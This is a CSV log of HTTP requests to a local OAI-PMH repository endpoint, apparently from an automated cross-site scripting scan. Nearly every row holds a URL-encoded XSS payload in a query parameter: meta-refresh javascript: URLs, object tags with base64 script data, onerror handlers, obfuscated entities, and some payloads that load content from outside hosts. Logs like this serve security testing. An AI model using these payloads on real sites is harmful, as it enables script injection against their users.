uuid,timestamp,http_status_code,request_url,response_time,http_version
72e5a23d-2981-4ba4-8dd2-41edfacc4e34,2025-01-02 03:22:52,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&set=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E,2121.71 ms,HTTP/1.1
8514a28e-1613-4572-bd27-bbb8339b18a4,2025-01-02 03:22:54,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&set=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E,2140.64 ms,HTTP/1.1
894abd18-aa78-456a-8830-803249f7fe39,2025-01-02 03:22:57,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Aconfirm%281%29%22%3E&metadataPrefix=oai_dc,2127.86 ms,HTTP/1.1
0f373dd5-d943-4f26-b44b-864c142c5a69,2025-01-02 03:22:59,403,http://localhost:8081/oai/request?verb=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2073.71 ms,HTTP/1.1
3a7846cb-8904-49b5-91c7-4458b6fedf11,2025-01-02 03:23:02,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2139.05 ms,HTTP/1.1
55026e11-644e-409d-9430-174e80515308,2025-01-02 03:23:04,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2126.01 ms,HTTP/1.1
d359dc8f-0580-4d48-8389-a864eb0fa6bf,2025-01-02 03:23:06,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&set=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2146.16 ms,HTTP/1.1
02601369-3853-4fca-aff2-7563afeb690f,2025-01-02 03:23:09,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2148.00 ms,HTTP/1.1
02c2aafc-a208-4cad-9d6d-b481d0645fa3,2025-01-02 03:23:11,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cmeta+http-equiv%3D%22refresh%22+content%3D%220%3Burl%3Djavascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=marc,2114.10 ms,HTTP/1.1
f3fd70a3-82a7-4b4b-943b-f75bebd61093,2025-01-02 03:23:14,403,http://localhost:8081/oai/request?verb=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2057.95 ms,HTTP/1.1
0a5b32a9-3cb7-4bb6-8778-694274d1fc69,2025-01-02 03:23:16,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2161.59 ms,HTTP/1.1
4a931bca-01b8-459d-9320-ee22998e862c,2025-01-02 03:23:18,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2152.77 ms,HTTP/1.1
caa79019-24d7-4c18-931c-ce9675c004a9,2025-01-02 03:23:21,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&until=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&set=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E,2159.55 ms,HTTP/1.1
926aa840-e037-4539-a721-45628a534dfd,2025-01-02 03:23:23,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2217.71 ms,HTTP/1.1
9a11b1ef-31fa-4610-8177-abe773de8301,2025-01-02 03:23:26,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+classid%3D%22clsid%3A...%22+codebase%3D%22javascript%3Adocument.vulnerable%3Dtrue%3B%22%3E&metadataPrefix=oai_dc,2184.59 ms,HTTP/1.1
71293ed4-689a-4617-b4d5-deee25b5625f,2025-01-02 03:23:28,403,http://localhost:8081/oai/request?verb=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E,2080.39 ms,HTTP/1.1
b675215f-9c4a-457a-b666-8d928dd747f9,2025-01-02 03:23:31,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2132.48 ms,HTTP/1.1
21a39b4d-d8a9-4a8c-91fa-c57d60619166,2025-01-02 03:23:33,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E,2124.56 ms,HTTP/1.1
295a5817-d445-4bfa-bc30-ce326fd97d78,2025-01-02 03:23:35,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&until=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E,2137.53 ms,HTTP/1.1
9b2b3438-6f18-45a2-87ed-067f1d9eee74,2025-01-02 03:23:38,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E&set=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E,2149.88 ms,HTTP/1.1
ea776ab2-71c0-444b-9b27-b45c84d53065,2025-01-02 03:23:40,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2C%25%28base64%29s%22%3E&metadataPrefix=oai_dc,2102.00 ms,HTTP/1.1
2be562a0-e770-4eeb-9be6-2ebb9da3ce5c,2025-01-02 03:23:43,403,http://localhost:8081/oai/request?verb=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,2095.64 ms,HTTP/1.1
b722b1ca-0d14-42c7-9c93-01f51a851dba,2025-01-02 03:23:45,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,2128.53 ms,HTTP/1.1
70c9c472-b435-412b-a358-8361d660d416,2025-01-02 03:23:47,200,http://localhost:8081/oai/request?verb=ListSets,2103.25 ms,HTTP/1.1
d0bffb54-2051-40f2-90fe-20f86f8e72bb,2025-01-02 03:23:50,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E&until=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E&set=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,2132.93 ms,HTTP/1.1
28845da4-09a5-4090-89d8-274400cd26d5,2025-01-02 03:23:52,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E,2172.90 ms,HTTP/1.1
f8cde11b-5adf-4a6c-a0f5-bfc9381c5e0d,2025-01-02 03:23:55,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+data%3D%22data%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D%22%3E&metadataPrefix=marc,2115.19 ms,HTTP/1.1
c4ada1b1-ceb9-45d8-974c-b89539550729,2025-01-02 03:23:57,403,http://localhost:8081/oai/request?verb=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E,2081.17 ms,HTTP/1.1
a8dd3863-e4b3-46a9-901d-13472df8c551,2025-01-02 03:23:59,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E,2147.05 ms,HTTP/1.1
e5b39b01-03f9-41e7-90c7-7e838228e211,2025-01-02 03:24:02,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E,2117.33 ms,HTTP/1.1
d18edcf6-30b8-4314-a53f-11873414fe82,2025-01-02 03:24:04,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E&until=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E,2126.32 ms,HTTP/1.1
769241b2-7e72-4636-8dfa-c2183eed05c0,2025-01-02 03:24:07,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E,2150.81 ms,HTTP/1.1
d706eb5e-252e-49c0-a06e-540ab341a89a,2025-01-02 03:24:09,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+data%3D%22http%3A%2F%2Fcorkami.googlecode.com%2Fsvn%2F%21svn%2Fbc%2F480%2Ftrunk%2Fmisc%2Fpdf%2Fhelloworld_js_X.pdf%22%3E&metadataPrefix=marc,2135.05 ms,HTTP/1.1
14af194e-2585-43d6-ae43-f5f498dd3cf9,2025-01-02 03:24:11,403,http://localhost:8081/oai/request?verb=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E,2087.27 ms,HTTP/1.1
6a840638-3132-49ec-9b84-d0cc301b4d6a,2025-01-02 03:24:14,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E,2119.74 ms,HTTP/1.1
a9ba0196-0b7f-478e-bca8-ae3f3c57c80d,2025-01-02 03:24:16,200,http://localhost:8081/oai/request?verb=ListSets,2126.98 ms,HTTP/1.1
b47c7435-f6d5-40be-9d86-6027164ff4ca,2025-01-02 03:24:19,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E&until=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E,2126.12 ms,HTTP/1.1
75e2b4a0-c7e4-497c-a01f-ff5ce5e6ef20,2025-01-02 03:24:21,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc,2205.87 ms,HTTP/1.1
c3ce7119-4977-47a2-b1df-c9dbaa02364a,2025-01-02 03:24:23,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+data%3Ddata%3Atext%2Fhtml%3Bbase64%2CPHN2Zy9vbmxvYWQ9YWxlcnQoMik%2B%3E%3C%2Fobject%3E&metadataPrefix=oai_dc,2131.21 ms,HTTP/1.1
5426d1cf-9b24-4472-a4c9-d6f3a06a14d0,2025-01-02 03:24:26,403,http://localhost:8081/oai/request?verb=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,2083.15 ms,HTTP/1.1
40cd9e4c-7d84-480a-9fec-da25907a1ab2,2025-01-02 03:24:28,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,2153.56 ms,HTTP/1.1
c9806d22-24ac-4d69-901b-36542cb4df2d,2025-01-02 03:24:31,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,2148.45 ms,HTTP/1.1
8f0d5745-fc27-49b7-a356-999f9af54c5c,2025-01-02 03:24:33,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc,2105.30 ms,HTTP/1.1
50ff46a3-bebc-4d3e-97cf-0809fd28d5f2,2025-01-02 03:24:35,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E&until=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E&set=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,2152.22 ms,HTTP/1.1
e0065792-3227-4d59-9c65-bb9d52f1a070,2025-01-02 03:24:38,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E&metadataPrefix=marc,2158.35 ms,HTTP/1.1
14743056-7703-41d4-8201-d0eb53c63945,2025-01-02 03:24:40,403,http://localhost:8081/oai/request?verb=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E,2079.44 ms,HTTP/1.1
003797bd-c0ea-4230-bedf-3bbe07c74b72,2025-01-02 03:24:43,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2134.05 ms,HTTP/1.1
1115b3ab-c7c3-4df6-9535-90fe49fa343c,2025-01-02 03:24:45,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E,2140.60 ms,HTTP/1.1
514f6a7b-0be3-45c9-893a-cda9f7847362,2025-01-02 03:24:47,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E&until=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E,2126.35 ms,HTTP/1.1
42f40e5d-ee11-4db9-a7f2-df9f2834f8d6,2025-01-02 03:24:50,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E&set=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E,2121.05 ms,HTTP/1.1
4fa94900-4466-47b6-8e93-0d53caf9ee48,2025-01-02 03:24:52,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+id%3D%22x%22+classid%3D%22clsid%3ACB927D12-4FF7-4a9e-A169-56E4B8A75598%22%3E%3C%2Fobject%3E+%3Cobject+classid%3D%22clsid%3A02BF25D5-8C17-4B23-BC80-D3488ABDDC6B%22+onqt_error%3D%22javascript%3Aalert%281%29%22+style%3D%22behavior%3Aurl%28%23x%29%3B%22%3E%3Cparam+name%3Dpostdomevents+%2F%3E%3C%2Fobject%3E&metadataPrefix=oai_dc,2108.97 ms,HTTP/1.1
340ef33f-6a37-4f15-ba79-be8b5bc3b488,2025-01-02 03:24:55,403,http://localhost:8081/oai/request?verb=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E,2075.88 ms,HTTP/1.1
d835ee0c-a06c-4999-97d5-5e41a3460d55,2025-01-02 03:24:57,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E,2127.68 ms,HTTP/1.1
5f7ee639-8033-434d-b128-62a8c0b7d394,2025-01-02 03:24:59,200,http://localhost:8081/oai/request?verb=ListSets,2118.47 ms,HTTP/1.1
d5b0a206-5d8b-420e-ab47-6397f39ae5ad,2025-01-02 03:25:02,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=oai_dc&from=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E&until=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E,2130.41 ms,HTTP/1.1
c35bea4a-f259-45ea-8113-3ac82fb7176b,2025-01-02 03:25:04,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&from=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E&set=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E,2145.47 ms,HTTP/1.1
22533d24-0c11-40b8-bfcc-58eb6ad3816d,2025-01-02 03:25:07,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+onError+object+onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onError%3E&metadataPrefix=marc,2130.37 ms,HTTP/1.1
34ba1aef-9a6a-44a4-87bd-120d8d8a3063,2025-01-02 03:25:09,403,http://localhost:8081/oai/request?verb=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E,2064.65 ms,HTTP/1.1
840eb2a3-6816-4af0-b4b1-31f780ebbbb3,2025-01-02 03:25:11,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E,2120.27 ms,HTTP/1.1
2da0fe66-152b-4dd4-89ad-d3d6ec4da07d,2025-01-02 03:25:14,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E,2139.86 ms,HTTP/1.1
2aa1e73a-4b71-4d1a-9203-165f5d5042f0,2025-01-02 03:25:16,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&from=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E&set=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E,2152.37 ms,HTTP/1.1
957bf0ab-399d-4226-b0ac-b2caa6719b58,2025-01-02 03:25:19,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&until=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E,2119.58 ms,HTTP/1.1
82ecc128-bf35-4605-8731-fd73c25e64d7,2025-01-02 03:25:21,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+onbeforeload+object+onbeforeload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C%2Fobject+onbeforeload%3E&metadataPrefix=oai_dc,2143.56 ms,HTTP/1.1
96170e30-1dd5-430a-b3c6-492934ad6387,2025-01-02 03:25:23,403,http://localhost:8081/oai/request?verb=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E,2060.65 ms,HTTP/1.1
460a2698-5706-4ed3-86cb-f5ac5167bfce,2025-01-02 03:25:26,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E,2127.90 ms,HTTP/1.1
c61d6d19-c356-4177-af2f-ce8d1910588f,2025-01-02 03:25:28,200,http://localhost:8081/oai/request?verb=ListSets,2123.59 ms,HTTP/1.1
8dae6733-faa7-401c-9970-fc760ff7a364,2025-01-02 03:25:31,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E&set=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E,2140.59 ms,HTTP/1.1
3609a22d-4c8f-4d4f-8fa8-30418e2aea1c,2025-01-02 03:25:33,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=marc&from=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E,2135.83 ms,HTTP/1.1
38dac504-1b8a-4895-afe0-cedf1ea25931,2025-01-02 03:25:35,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+onerror%3Djavascript%3Ajavascript%3Aalert%281%29%3E&metadataPrefix=marc,2130.37 ms,HTTP/1.1
02d4833f-2877-4d98-9321-78ea9beecbfb,2025-01-02 03:25:38,403,http://localhost:8081/oai/request?verb=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E,2099.78 ms,HTTP/1.1
6848046f-1505-452b-b9ad-968eab52e3c3,2025-01-02 03:25:40,200,http://localhost:8081/oai/request?verb=ListMetadataFormats&identifier=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E,2143.65 ms,HTTP/1.1
3edcdc3a-c04c-4398-876c-422b21bd0dba,2025-01-02 03:25:43,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E,2119.07 ms,HTTP/1.1
4152bf71-779f-4beb-ae6d-576be2c95058,2025-01-02 03:25:45,200,http://localhost:8081/oai/request?verb=ListIdentifiers&metadataPrefix=marc&until=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E&set=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E,2099.99 ms,HTTP/1.1
3215a118-41c0-479d-b094-23b12c917295,2025-01-02 03:25:47,200,http://localhost:8081/oai/request?verb=ListRecords&metadataPrefix=oai_dc&until=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E&set=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E,2124.82 ms,HTTP/1.1
13060629-0d4b-4246-b949-6509652a5b86,2025-01-02 03:25:50,200,http://localhost:8081/oai/request?verb=GetRecord&identifier=%3Cobject+src%3D1+href%3D1+onerror%3D%22javascript%3Aalert%281%29%22%3E%3C%2Fobject%3E&metadataPrefix=marc,2110.70 ms,HTTP/1.1
6bb55703-2274-4982-8044-048fa990a40d,2025-01-02 03:25:52,403,http://localhost:8081/oai/request?verb=%3Cobject+type%3D%22text%2Fx-scriptlet%22+data%3D%22http%3A%2F%2Fjsfiddle.net%2FXLE63%2F+%22%3E%3C%2Fobject%3E,2075.54 ms,HTTP/1.1
70da2e67-50fe-4d84-bf9f-3abf589488b1,2025-01-02 03:25:55,200,http://localhost:8081/oai/request?verb=ListMetadataFormats,2135.96 ms,HTTP/1.1
6f88b401-25c4-487c-a9f7-f2f0fa7298e7,2025-01-02 03:25:57,200,http://localhost:8081/oai/request?verb=ListSets&resumptionToken=%3Cobject+type%3D%22text%2Fx-scriptlet%22+data%3D%22http%3A%2F%2Fjsfiddle.net%2FXLE63%2F+%22%3E%3C%2Fobject%3E,2144.96 ms,HTTP/1.1
